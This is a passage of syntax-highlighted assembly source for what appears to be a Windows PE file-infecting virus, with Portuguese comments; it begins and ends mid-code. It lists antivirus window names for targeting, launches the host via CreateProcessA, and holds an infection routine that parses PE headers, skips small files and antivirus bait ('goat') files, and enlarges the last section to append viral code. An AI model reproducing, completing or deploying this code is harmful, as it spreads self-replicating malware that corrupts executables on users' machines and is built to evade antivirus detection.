   </span><span class="sc5">anti@002</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti@003</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti@004</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti@006</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti@007</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti@008</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti@009</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti@010</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti@011</span><span class="sc0">
   </span><span class="sc5">anti@003</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AntiViral Toolkit Pro'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">anti@004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'AVP Monitor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">anti@006</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Vsstat'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">anti@007</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Webscanx'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">anti@008</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Avconsol'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">anti@009</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'McAfee VirusScan'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">anti@010</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Vshwin32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">anti@011</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Central do McAfee VirusScan'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">user@001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'USER32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">user@003</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindWindowA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">user@004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">aste@001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">depack@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; buffer@001 tem o nome e o path completo do arquivo</span><span class="sc0">
   </span><span class="sc1">; esi tem o offset pro codigo compactado</span><span class="sc0">

   </span><span class="sc1">; criar arquivo padrao de 16K</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IO@002</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">depack@002</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_aP_depack_asm</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

   </span><span class="sc1">; refazendo o tamanho original...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IOB@001</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">depack@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">play@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@002</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetStartupInfoA</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@003</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@002</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">67108928h</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CreateProcessA</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">infectar@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; tamanho do arquivo em eax</span><span class="sc0">
   </span><span class="sc1">; arquivos menores de 8Kb nao serao infectados</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mena</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Arquivo a ser infectado:'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">mena</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">user@005</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">

   </span><span class="sc9">ELSE</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">101</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">infectar@002</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@002</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8192</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">infectar@003</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lstrlen</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'LD.2'</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@003</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'LD.2'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'XE.2'</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infectar@002</span><span class="sc0">

   </span><span class="sc5">infectar@003</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; arquivo nao infectado, vamos tentar abri-lo</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IO@001</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@002</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lodsw</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc12">'??'</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'??'</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">

   </span><span class="sc6">lodsw</span><span class="sc0">
   </span><span class="sc6">lodsw</span><span class="sc0">
   </span><span class="sc6">lodsw</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

   </span><span class="sc1">; trabalhamos com WORD</span><span class="sc0">

   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000ffffh</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">108</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">120</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@004</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc1">; ecx está apontando para o header da ultima seção</span><span class="sc0">

   </span><span class="sc1">; seção:</span><span class="sc0">
   </span><span class="sc1">; 0-8   nome</span><span class="sc0">
   </span><span class="sc1">; 8-12  espaço ocupado na memoria</span><span class="sc0">
   </span><span class="sc1">; 12-16 rva da seçao</span><span class="sc0">
   </span><span class="sc1">; 16-20 espaço ocupado no arquivo</span><span class="sc0">
   </span><span class="sc1">; 20-24 offset para o inicio da seçao</span><span class="sc0">
   </span><span class="sc1">; 36-40 flags da seçao</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">

   </span><span class="sc1">; neste momento:</span><span class="sc0">
   </span><span class="sc1">; eax é a IMAGEBASE do arquivo</span><span class="sc0">
   </span><span class="sc1">; edx é a IMAGEBASE + o RVA da ultima seção</span><span class="sc0">
   </span><span class="sc1">; ecx é um offset para o header da ultima seção</span><span class="sc0">
   </span><span class="sc1">; esi é um offset para o header do PE mais 8 bytes (porque mais 8 bytes ?)</span><span class="sc0">
   </span><span class="sc1">; ebp é o tamanho do arquivo</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@006</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">infectar@005</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@006</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">infectar@006</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">15ffh</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">

   </span><span class="sc1">; evitar instruções como: mov ax, 15ffh</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@006</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infectar@005</span><span class="sc0">

   </span><span class="sc5">infectar@006</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; aponta para a DWORD</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc1">; se nós estamos aqui, provavelmente este deve ser um</span><span class="sc0">
   </span><span class="sc1">; arquivo verdadeiro, e nao um teste dos antivirus.</span><span class="sc0">
   </span><span class="sc1">; ele possui mais de 20 chamadas a DWORDS (CALL DWORD PTR [XxX])</span><span class="sc0">
   </span><span class="sc1">; que sao verdadeiras (pelo menos no meu calculo), isso</span><span class="sc0">
   </span><span class="sc1">; indica um codigo com muitas chamadas a api's, os</span><span class="sc0">
   </span><span class="sc1">; arquivos-isca dos antivirus (chamados de GOAT files) geralmente</span><span class="sc0">
   </span><span class="sc1">; tem apenas UMA chamada a api, provavelmente ExitProcess.</span><span class="sc0">

   </span><span class="sc1">; está na hora da infecção :)</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">72</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@004</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@memory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc5">infectar@007</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">72</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">infectar@007</span><span class="sc0">

   </span><span class="sc1">; memória geral aumentada...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@memory</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc5">infectar@008</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">infectar@008</span><span class="sc0">

   </span><span class="sc1">; memoria da seção aumentada...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
